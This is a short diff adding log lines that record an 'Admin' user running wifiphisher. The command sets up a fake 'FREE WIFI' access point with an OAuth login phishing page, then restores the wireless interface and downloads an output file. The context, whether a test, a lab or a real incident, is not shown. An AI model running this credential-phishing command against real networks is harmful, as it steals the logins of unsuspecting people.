@@ -1,0 +1,4 @@
+2025-02-22 22:32:11 - User: Admin - INFO - Executing scan command: wifiphisher --essid "FREE WIFI" -p oauth-login -kB
+2025-02-22 22:32:13 - User: Admin - INFO - Executing restart command: airmon-ng stop wfphshr-wlan0; service NetworkManager restart
+2025-02-22 22:32:16 - User: Admin - INFO - Process terminated by user
+2025-02-22 22:45:07 - User: Admin - INFO - Downloading output file
